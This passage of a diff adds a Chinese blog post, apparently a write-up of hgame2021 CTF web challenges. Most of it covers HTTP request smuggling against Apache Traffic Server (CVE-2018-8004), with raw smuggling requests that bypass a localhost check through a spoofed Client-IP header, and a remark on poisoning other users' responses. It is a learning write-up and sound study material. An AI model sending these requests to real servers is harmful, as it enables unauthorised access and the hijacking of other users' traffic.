@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="大半年没打过CTF了，考完研来复健一下">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2021 web 复现">
+<meta property="og:url" content="http://yoursite.com/2021/01/31/hgame2021-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="大半年没打过CTF了，考完研来复健一下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/5457632af041c942aa306b25d08418cb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/e3e13c2987e3643727c748bab5a8a72d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/a0e3258ac0199e435d64242d8b321ddc.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/304c90bbd7400daa22135da4611f2919.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/9de7c15d77ba0c756a881302dea80657.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/810b40292c25966d86624f881e742252.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/70bbc9740ab33e6adf949236f24e2cd7.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/feef80d5838a37dc7df6df9404d59fec.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/197fc261761df79af07f23ff72a71ac4.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/d2b6ffd292c3511d0ef5eb02eb5aab68.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/fa98acee9935eace42c6e7beed62cec5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/b06bbd9ec41077bfb1581098f7a18458.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0b37e16790f1a6bfa7d1cd5c27c7c263.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6799a8f91dc52f6aa355219bb90435aa.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/083cea019b778569ca28f634d3e4c46d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/c7fd45b3b462e518450181f9bfc76b81.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/b521f1a60ab87323c3f46da52743211c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/da8d2878b06f061c32fbfd82a6f73687.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/bea07a80797b6fc7027ef3702ebc3444.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/20f4d176e5329b4296116905e98e561c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/e4c40bda3f4006479de48b490ffcdf14.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/73e91ba980043766d368b289d204499e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6c1d1d3a275445e31960c92ba179a59c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/ec33b9fb9ead01cbe04c26606fe57968.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/4cceffb7d3a2d395e24600bf77cf47ee.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/883f4b830940ccf88ae700056ce465ed.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/86b476179940b8bff1bb393cf44dfd87.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/2a724d75a46b24d9158dabb3edda0722.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/48cc8a7444940127c7078fcbd32712cd.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/04d7960b790f935d84eb4ca705bb79f9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/2ac00d6c8ffd1d16339253de8ce1a972.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/676dc302976f3db169f4892e474b92de.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/39dd3943e58e4ccb9385f3346acc5ba7.jpg">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/df4684c03c05c4d588f819a15effb894.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0ecf98f9a7ad07cc6675e2f9fae159d8.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/ccebdaece653befd94757a2cf1d977c7.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/7d272ceee6ad84d28747753ece936750.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/b105a728e154a202ba6a8a987a038002.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0171e837b24267761f11b8ec2819cb56.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/a1e5306a287d1ee6280397d6889eef98.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/31da2384da9a340c32442e25c048b4f2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/f8292f5a0021b79be8bce7860fce62c7.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/d06cbd9922476102b19244c82d474eb2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/bb2c1e5610ac9ffefeea9e316dad3e70.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/93de45227864c2aaa7e1695e8e293198.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/397cd9b13df7a1dfb70f0ced831b785e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/fce7af8f889bfe19e4abef7b0e5b73ab.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/9fd896d8c0e3d9130128fd7601ff9993.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6d2bf22c4c50997bd2a7e2cb3331eba3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/e1b836c8f88dce59187c6053170701b0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0ae2c732282ecdba75525ea8bf1b27bd.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/7cff5eeca9b13a7b588f68b0de88042f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/a71da0e9fb20a1030f3b00ddd6d5b5c9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/92158ec445decdb11741ececf85f50d2.png">
+<meta property="og:updated_time" content="2021-02-21T13:22:54.052Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hgame2021 web 复现">
+<meta name="twitter:description" content="大半年没打过CTF了，考完研来复健一下">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/hgame2021_web_wp/5457632af041c942aa306b25d08418cb.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/01/31/hgame2021-web-wp/">
+
+
+
+
+
+  <title>hgame2021 web 复现 | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/31/hgame2021-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hgame2021 web 复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-31T12:43:53+09:00">
+                2021-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>大半年没打过CTF了，考完研来复健一下</p>
+<a id="more"></a>
+<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h2><p>打开页面点击顺风车的链接发现跳回了<code>index.php</code>，查看源码发现<br><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/5457632af041c942aa306b25d08418cb.png" alt=""><br>本应该是去到<code>HitchhikerGuide.php</code>却又跳了回来，应该是<code>302</code>了</p>
+<p>那就抓包一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/e3e13c2987e3643727c748bab5a8a72d.png" alt=""></p>
+<p>405错误，那就用POST试试<br><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/a0e3258ac0199e435d64242d8b321ddc.png" alt=""></p>
+<p>改下UA<br><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/304c90bbd7400daa22135da4611f2919.png" alt=""></p>
+<p>再改下Referer<br><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/9de7c15d77ba0c756a881302dea80657.png" alt=""></p>
+<p>加上XFF<br><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/810b40292c25966d86624f881e742252.png" alt=""></p>
+<p>少一个回车就会超时，害</p>
+<h2 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h2><p>这题感觉应该是道js题，但怎么都找不到发送分数的api，于是就直接打到2k分出来了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/70bbc9740ab33e6adf949236f24e2cd7.png" alt=""></p>
+<p>真的是qnm的大西瓜，看flag <code>hgame{do_you_know_cocos_game?}</code> 像是<code>Cocos2d-x</code>游戏引擎的题，八成也是分析js，等wp出来再看看吧</p>
+<p>看了下官方wp，是可以用<code>cocos debug tools</code>来操作。不过教程有点少orz</p>
+<p>另外，没想到判断是大于1999就给flag，还以为判断是等于2000搞得一直找不到<br>在<code>project.js</code>中可以查找到<code>1999</code>这个字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gameOverShowText: function (e, t) &#123;</span><br><span class="line">	if(e &gt; 1999)&#123;</span><br><span class="line">		alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应的是<code>gameOverShowText()</code>，里面的内容base64解码即是flag</p>
+<h2 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h2><p>这题进入<code>/secret</code>提示需要有<code>Client-IP</code>并以<code>localhost</code>访问，于是带上<code>Client-IP</code>伪造一下果然失败了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/feef80d5838a37dc7df6df9404d59fec.png" alt=""></p>
+<p>于是尝试找能<code>ssrf</code>的地方，不过就两个页面也没啥功能，又尝试了一下也不行</p>
+<p>再回去看看http包</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/197fc261761df79af07f23ff72a71ac4.png" alt=""></p>
+<p>发现服务器是个没看过的，于是就去查ATS的漏洞，查到了两个CVE，不过想应该不会出CVE的题吧于是就略过了，结果没找到什么东西。疯狂挠头一阵后回去看到题目的名字，突然就想到了<code>http走私</code>，于是和ATS一起查了一下居然就查到了，就是刚刚被忽略了<code>CVE-2018-8004</code><br>后来hint中也给出了文章<br><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
+<p>这里要先了解两个东西，ATS和http走私<br>ATS全称<code>Apache Traffic Server</code>，一般架构于网络边缘，用于进行反向代理、缓存储存<br>然后重点是http走私<br>上面的文章也说得很清楚了，htt走私主要是由于前端与后端对http请求处理不一致所导致的，主要分为五种</p>
+<h3 id="前端处理CL-Content-Length-而后端不处理"><a href="#前端处理CL-Content-Length-而后端不处理" class="headerlink" title="前端处理CL(Content-Length)而后端不处理"></a>前端处理CL(Content-Length)而后端不处理</h3><p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/d2b6ffd292c3511d0ef5eb02eb5aab68.png" alt=""></p>
+<p>结果就是像这样的请求，由于前端根据CL值为44判断是一个请求，而后端不处理CL，直接就认为了这是两个请求</p>
+<h3 id="同一请求中有两个CL，而前端只处理第一个，后端处理第二个（CL-CL）"><a href="#同一请求中有两个CL，而前端只处理第一个，后端处理第二个（CL-CL）" class="headerlink" title="同一请求中有两个CL，而前端只处理第一个，后端处理第二个（CL-CL）"></a>同一请求中有两个CL，而前端只处理第一个，后端处理第二个（CL-CL）</h3><p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/fa98acee9935eace42c6e7beed62cec5.png" alt=""></p>
+<p>比如像这样一个请求，前端读取第一个CL认为请求体包括了<code>12345\r\na</code>，而后端读取第二个CL，认为请求体只包括到了<code>12345\r\n</code>。于是后面的<code>a</code>就到了缓冲区之中，当又有用户进行这样一个访问时</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/b06bbd9ec41077bfb1581098f7a18458.png" alt=""></p>
+<p>就会出现没有<code>aGET</code>请求的错误</p>
+<h3 id="在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）"><a href="#在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）" class="headerlink" title="在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）"></a>在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）</h3><p>在<code>Transfer-Encoding: chunked</code>下数据格式是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
+<p>分块大小的值在前，后面是分块数据。当到尾部时，分块大小的值为0，然后以<code>\r\n\r\n</code>结束</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0b37e16790f1a6bfa7d1cd5c27c7c263.png" alt=""></p>
+<p>像这样的一个请求，前端处理CL后认为请求体为6，包括<code>0\r\n\r\nG</code>。而后端处理TE后，检测到<code>0\r\n\r\n</code>就认为这个请求已经结束了，<code>G</code>就进入了缓冲区。结果就是再发送一个正常的POST请求进来，就会出现没有<code>GPOST</code>请求的错误</p>
+<h3 id="前端只处理TE，后端只处理CL（TE-CL）"><a href="#前端只处理TE，后端只处理CL（TE-CL）" class="headerlink" title="前端只处理TE，后端只处理CL（TE-CL）"></a>前端只处理TE，后端只处理CL（TE-CL）</h3><p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6799a8f91dc52f6aa355219bb90435aa.png" alt=""></p>
+<p>像这个请求，前端接受后检测到<code>0\r\n\r\n</code>后才认为请求结束，于是就把<code>12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code>认为是属于请求体的。而后端根据CL值，认为<code>12\r\n</code>请求就结束了，于是连续访问后就会出现没有<code>GPOST</code>请求的错误</p>
+<h3 id="前后端都处理TE"><a href="#前后端都处理TE" class="headerlink" title="前后端都处理TE"></a>前后端都处理TE</h3><p>这时虽然处理相同了，但我们可以通过对TE进行混淆，使得其中一个服务器不处理TE，结果造成<code>TE-CL</code>/<code>CL-TE</code>的http走私</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/083cea019b778569ca28f634d3e4c46d.png" alt=""></p>
+<p>像这个请求，尝试用两个TE去混淆，使得后端服务器不处理TE只处理CL，造成<code>TE-CL</code>的http走私</p>
+<p>而由<code>CVE-2018-8004</code>爆出的ATS的http走私漏洞存在于<code>6.0.0~6.2.2</code>和<code>7.0.0~7.1.3</code>中，该题中的版本是<code>7.1.2</code>正好可以用。而后续官方对该漏洞提供了4个补丁，同时也是四种利用</p>
+<h3 id="3192-如果字段名称后面和冒号前面有空格，则返回400"><a href="#3192-如果字段名称后面和冒号前面有空格，则返回400" class="headerlink" title="3192 如果字段名称后面和冒号前面有空格，则返回400"></a><a href="https://github.com/apache/trafficserver/pull/3192" target="_blank" rel="noopener">3192 如果字段名称后面和冒号前面有空格，则返回400</a></h3><p>若在请求中，在一条请求头的请求字段和<code>:</code>之间存在空格字段时，AST不会对其做处理，将其作为正常字段处理，然后直接转发给后端服务器。而当后端服务器处理不了有空格的字段时就会产生问题，像<code>Nginx</code>就会无视该条请求头，不会响应400错误</p>
+<p>在这题中我们构造这样的请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Content-Length : 49</span><br><span class="line"></span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">foo:</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/c7fd45b3b462e518450181f9bfc76b81.png" alt=""></p>
+<p>第一次访问时访问的是<code>/</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/b521f1a60ab87323c3f46da52743211c.png" alt=""></p>
+<p>当我们连续地再访问一次时就访问到了<code>/secret</code><br>原因就是ATS接到请求后，没有去处理<code>Content-Length : 49</code>字段与<code>:</code>之间的空格，并认为该GET请求的请求体长度为49，将其作为一个请求发给了后端。而后端处理不了<code>Content-Length : 49</code>，将其忽略，结果就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">foo:</span><br></pre></td></tr></table></figure>
+<p>进入了缓冲区，当我们再访问一次时，后端会响应的请求就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">foo:GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br></pre></td></tr></table></figure>
+<p>结果就访问到了<code>/secret</code><br>解这道题的方式就是把<code>Client-IP: 127.0.0.1</code>放到第二条请求中，连续访问就行了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/da8d2878b06f061c32fbfd82a6f73687.png" alt=""></p>
+<h3 id="3201-当返回400错误时，关闭连接"><a href="#3201-当返回400错误时，关闭连接" class="headerlink" title="3201 当返回400错误时，关闭连接"></a><a href="https://github.com/apache/trafficserver/pull/3201" target="_blank" rel="noopener">3201 当返回400错误时，关闭连接</a></h3><p>在<code>CVE-2018-8004</code>所涉及到的ATS版本中，当ATS接收到的请求造成了400错误，依旧不会关闭建立了的TCP连接</p>
+<p>这题中我们构造这样的一个请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">aa:\0bb</span><br><span class="line">cc:dd</span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/bea07a80797b6fc7027ef3702ebc3444.png" alt=""></p>
+<p>可以看到服务器响应了两个<code>Bad Request</code><br>当AST解析这个请求时，遇到了<code>NULL(\0)</code>，于是进行截断成两个请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">aa:</span><br></pre></td></tr></table></figure>
+<p>和</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bb</span><br><span class="line">cc:dd</span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br></pre></td></tr></table></figure>
+<p>由于遇到了<code>NULL</code>，AST就直接对第一个请求响应了400。而第二个请求也明显不符合规范，于是也响应了400</p>
+<p>修改一下请求再尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">aa:\0bb</span><br><span class="line">cc:dd</span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/20f4d176e5329b4296116905e98e561c.png" alt=""></p>
+<p>可以看到这次请求中，第二个请求正常响应了。这里其实我不太理解，第二个请求应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bb</span><br><span class="line">GET /secret HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br></pre></td></tr></table></figure>
+<p>应该也不符合http的规范才对，但却成功响应了，试了几次后发现只要第二个请求行前没有两行都能成功响应，这要去翻翻ATS的手册看看了</p>
+<p>除此之外我们也可以通过这种方式进行http走私</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">aa:\0bb</span><br><span class="line">GET http://thief.0727.site/secret HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/e4c40bda3f4006479de48b490ffcdf14.png" alt=""></p>
+<p>通过这种方式，我们可以将第二个请求设置为恶意网站。将这个请求发送给AST服务器，然后等待下一个访问该服务器的用户，这个用户收到的响应就会是我们设置的恶意网站上。不过虽然理论上可行，但利用的条件比较苛刻。像这道题就不适合使用这种攻击</p>
+<h3 id="3231-验证请求中的Content-Length头"><a href="#3231-验证请求中的Content-Length头" class="headerlink" title="3231 验证请求中的Content-Length头"></a><a href="https://github.com/apache/trafficserver/pull/3231" target="_blank" rel="noopener">3231 验证请求中的Content-Length头</a></h3><p>更加详细的描述是<br>当<code>Content-Length</code>请求头不匹配时，响应400，删除具有相同<code>Content-Length</code>请求头的重复副本，如果存在<code>Transfer-Encoding</code>请求头，则删除<code>Content-Length</code>请求头</p>
+<p>也就是说在修复漏洞之前，可能存在<code>CL-TE</code>的利用<br>像上面分析的，构造报文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/73e91ba980043766d368b289d204499e.png" alt=""></p>
+<p>连续访问两次后出现405错误<br>这题中我们就直接在下面构造一个新请求，并带上<code>Client-IP:127.0.0.1</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6c1d1d3a275445e31960c92ba179a59c.png" alt=""></p>
+<p>连续访问后，第二次的请求就是</p>
